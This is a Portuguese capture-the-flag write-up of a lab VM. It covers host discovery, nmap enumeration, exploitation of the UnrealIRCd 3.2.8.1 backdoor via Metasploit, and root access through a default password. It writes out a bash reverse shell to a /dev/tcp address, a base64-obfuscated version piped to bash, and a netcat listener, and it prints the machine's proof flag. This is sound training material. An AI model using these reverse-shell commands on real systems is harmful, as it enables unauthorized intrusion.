# Host Discovery

Aqui também preciso saber o ip da máquina. Sendo assim, preciso fazer um arp-scan na rede

```bash
sudo arp-scan --interface=eth1 192.168.56.0/24
```

Como resultado, tenho algo parecido com isso:

```bash
┌──(kali㉿kali)-[~]
└─$ sudo arp-scan --interface=eth1 192.168.56.0/24
Interface: eth1, type: EN10MB, MAC: 08:00:27:fa:3b:5d, IPv4: 192.168.56.1
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.13   08:00:27:0f:dd:ea       (Unknown)

1 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.061 seconds (124.21 hosts/sec). 1 responded

```

E, com isso, já sei o ip da máquina.

# Information Gathering

Na verdade, vou ver se ela está rodando algum serviço http/https.
Digitei http://192.168.56.13, mas não obtive nada. Provavelmente, não está rodando nada desse tipo.

# Enumeration

Agora, vou fazer um scan de portas pra saber quais tipos de serviços a máquina está rodando.

```bash
nmap -Pn -sV -sC -p- 192.168.56.13
```

Estou scaneando todas as portas com -p- e verificando scripts para possíveis vulnerabilidades com -sC. Isso pode ser um pouco pesado em um cenário real, mas estamos em um CTF.

Como resposta, tenho algo parecido com isso:

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -Pn -sV -sC -p- 192.168.56.13       
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-12 11:49 EDT
Nmap scan report for 192.168.56.13
Host is up (0.0010s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
6667/tcp open  irc     UnrealIRCd
6697/tcp open  irc     UnrealIRCd
8067/tcp open  irc     UnrealIRCd
MAC Address: 08:00:27:0F:DD:EA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: irc.foonet.com

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.30 seconds


```

Como podemos ver, essa máquina está rodando um servidor de irc. Tentei ver a versão, mas só apareceu que o servidor é um UnrealIRCd.

Agora, vou ver se tem alguma vulnerabilidade nessa aplicação. Vou fazer isso pelo metasploit mesmo.

```bash
msf6 > search UnrealIRC

Matching Modules
================

   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12       excellent  No     UnrealIRCD 3.2.8.1 Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/irc/unreal_ircd_3281_backdoor                                      


```

Muito promissor. Esse serviço tem um backdoor conhecido e usaremos esse exploit para tentar ganhar acesso à máquina.

# Gaining Access

Agora, tentaremos rodar esse exploit.

```bash
msf6 > use 0
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) >
```

Vamos setar RHOSTS:

```bash
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > show options

Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:po
                                       rt[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://docs
                                       .metasploit.com/docs/using-metasploi
                                       t/basics/using-metasploit.html
   RPORT    6667             yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS 192.168.56.13
RHOSTS => 192.168.56.13

```

Agora, vamos setar um payload.

```bash
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > show payloads

Compatible Payloads
===================

   #   Name                                        Disclosure Date  Rank    Check  Description
   -   ----                                        ---------------  ----    -----  -----------
   0   payload/cmd/unix/adduser                    .                normal  No     Add user with useradd
   1   payload/cmd/unix/bind_perl                  .                normal  No     Unix Command Shell, Bind TCP (via Perl)
   2   payload/cmd/unix/bind_perl_ipv6             .                normal  No     Unix Command Shell, Bind TCP (via perl) IPv6
   3   payload/cmd/unix/bind_ruby                  .                normal  No     Unix Command Shell, Bind TCP (via Ruby)
   4   payload/cmd/unix/bind_ruby_ipv6             .                normal  No     Unix Command Shell, Bind TCP (via Ruby) IPv6
   5   payload/cmd/unix/generic                    .                normal  No     Unix Command, Generic Command Execution
   6   payload/cmd/unix/reverse                    .                normal  No     Unix Command Shell, Double Reverse TCP (telnet)
   7   payload/cmd/unix/reverse_bash_telnet_ssl    .                normal  No     Unix Command Shell, Reverse TCP SSL (telnet)
   8   payload/cmd/unix/reverse_perl               .                normal  No     Unix Command Shell, Reverse TCP (via Perl)
   9   payload/cmd/unix/reverse_perl_ssl           .                normal  No     Unix Command Shell, Reverse TCP SSL (via perl)
   10  payload/cmd/unix/reverse_ruby               .                normal  No     Unix Command Shell, Reverse TCP (via Ruby)
   11  payload/cmd/unix/reverse_ruby_ssl           .                normal  No     Unix Command Shell, Reverse TCP SSL (via Ruby)
   12  payload/cmd/unix/reverse_ssl_double_telnet  .                normal  No     Unix Command Shell, Double Reverse TCP SSL (telnet)

msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) >
```

Vou tentar usar o **cmd/unix/generic** para incluir um comando de reverse shell.

```bash
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set payload cmd/unix/generic
payload => cmd/unix/generic
```

Vamos ver o que temos de preencher:

```bash

msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > show options

Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:po
                                       rt[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://docs
                                       .metasploit.com/docs/using-metasploi
                                       t/basics/using-metasploit.html
   RPORT    6667             yes       The target port (TCP)


Payload options (cmd/unix/generic):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------
   CMD                    yes       The command string to execute


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.


msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) >
```

Temos de setar CMD.

```bash
sf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set CMD "bash -i >& /dev/tcp/192.168.56.1/4444 0>&1"
CMD => bash -i >& /dev/tcp/192.168.56.1/4444 0>&1
```

Antes de executar o exploit, preciso colocar o nc escutando a porta 4444 para receber o shell:

```bash
──(kali㉿kali)-[~]
└─$ nc -lnvp 4444             
listening on [any] 4444 ...
```

Agora, podemos tentar o exploit:

```bash
al_ircd_3281_backdoor) > exploit
[*] 192.168.56.13:6667 - Connected to 192.168.56.13:6667...
    :irc.foonet.com NOTICE AUTH :*** Looking up your hostname...
[*] 192.168.56.13:6667 - Sending backdoor command...
        [*] Exploit completed, but no session was created.

```

Parece que não foi. Isso acontece pq o metasploit pode quebrar o parsing com caracteres especiais e, por isso, o comando não foi correto para lá. É mais seguro encodar em base64 para enviar.

Primeiro, vamos gerar o base64 do comando:

```bash
┌──(kali㉿kali)-[~]
└─$ echo 'bash -i >& /dev/tcp/192.168.56.1/4444 0>&1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjEvNDQ0NCAwPiYxCg==
```

Agora que tenho base64, envio o comando decodando:



```bash
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set CMD "echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjEvNDQ0NCAwPiYxCg==' | base64 -d | bash"
CMD => echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjEvNDQ0NCAwPiYxCg==' | base64 -d | bash
```



Agora, executo o exploit:

```bash
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit
[*] 192.168.56.13:6667 - Connected to 192.168.56.13:6667...

```

Vou ver se o netcat recebeu a conexão:

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 4444             
listening on [any] 4444 ...
connect to [192.168.56.1] from (UNKNOWN) [192.168.56.13] 54434
bash: cannot set terminal process group (329): Inappropriate ioctl for device
bash: no job control in this shell
server@noontide:~/irc/Unreal3.2$
```

Maravilha! Obtive acesso à máquina. Vou ver qual usuário tá logado:

```bash
server@noontide:~/irc/Unreal3.2$ whoami
whoami
server

```

Estamos com um usuário que não é root e tentaremos escalar privilégio agora.

# Privilege Escalation

Vou tentar, como quem não quer nada, obter o root digitando a senha padrão root. (Muito improvável em um cenário real)



```bash
server@noontide:~/irc/Unreal3.2$ su
su
Password: root
```

Estamos como root:

```bash
whoami
root

```

Agora o que resta é verificar a pasta /root e capturar a flag

```bash
ls -la /root
total 24
drwx------  3 root root 4096 Aug  8  2020 .
drwxr-xr-x 18 root root 4096 Aug  8  2020 ..
lrwxrwxrwx  1 root root    9 Aug  8  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x  3 root root 4096 Aug  8  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-------  1 root root   85 Aug  8  2020 proof.txt
cat /root/proof.txt
ab28c8ca8da1b9ffc2d702ac54221105

Thanks for playing! - Felipe Winsnes (@whitecr0wz)

```

Parabéns ao Felipe Winsnes por essa room.